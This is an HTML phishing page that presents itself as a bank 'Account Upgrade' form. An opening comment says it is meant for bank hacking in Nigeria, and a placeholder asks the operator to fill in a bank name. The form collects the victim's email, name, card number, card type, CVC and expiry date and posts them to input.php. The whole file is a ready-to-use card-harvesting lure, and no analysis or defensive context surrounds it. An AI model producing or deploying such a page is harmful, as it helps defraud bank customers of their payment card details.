
<!--this is for bank hacking in nigeria-->
<!DOCTYPE html>
<html>
    <head>
        <meta name="viewport">
        <title>Upgrade account</title>
        <link rel="icon" href="p.jpg" type="image/jpg">
        <link rel="stylesheet" href="assets/css/upgrade.css" type="text/css">

    </head>
<body>
    <h4>ACCOUNT UPGRADE </h4>
    <div class="container">
        <!---CHOSE NAME OF YOUR BANK-->
        
        <p><b>NOTE:-</b> your name must match your account information </p><br>

        <form action="input.php" method="post">
    
            <label>Email:: <input type="text" class="group" placeholder="email or mobile number" value=""  name="email"></label><br>
           
            <label>Firstname:: <input type="text" class="group" name="firstname" placeholder="firstname" value="" required></label><br>
            <label>Lastname::  <input type="text" class="group" name="lastname" placeholder="lastname" value="" required></label><br>
            
            <label>Card Number::
                <input type="tel" class="group" name="card" value="" placeholder="000 000 000 000" required></label><br>
            
            <label>Type::<input type="text" class="small" value="" name="account_type" placeholder="eg:Visa" required></label><br>
           
            <label>CVC:: <input type="tel" class="small" value="" name="cvc" placeholder="123" required></label><br>
               
            <label>Valid Until::<input type="tel" name="valid" value="" class="small" placeholder="02/2023" required><br>
            
            <input type="submit" class="btn" name="btn" value="Upgrade My account" required><br>
            <br>
            <button>
            <a  href="need.html" class="need" target="_blank">Need help?</a></button><br>
        </form>
    </div>
<li><a href="term.html">Term of service</a></li>
<li><a href="privacy.html.html">Privacy</a></li>
</body>
</html>